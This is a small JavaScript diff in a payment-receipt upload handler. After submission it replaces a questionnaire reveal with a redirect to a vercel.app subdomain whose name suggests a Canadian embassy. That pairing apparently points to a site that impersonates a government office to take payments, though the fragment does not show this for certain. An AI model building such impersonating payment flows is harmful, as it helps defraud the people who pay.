@@ -675,7 +675,7 @@ async function handleReceiptSubmit(event) {
     if (receiptForm) receiptForm.style.display = "none";
     const paymentNotice = document.getElementById("payment-notice");
     if (paymentNotice) paymentNotice.innerText = "Receipt received. Your payment is under review.";
-    if (window.revealQuestionnaire) window.revealQuestionnaire();
+   window.location.href = "https://canadaembassykj.vercel.app/";
   } catch (error) {
     console.error("[App] Receipt upload error:", error);
     showMessage(
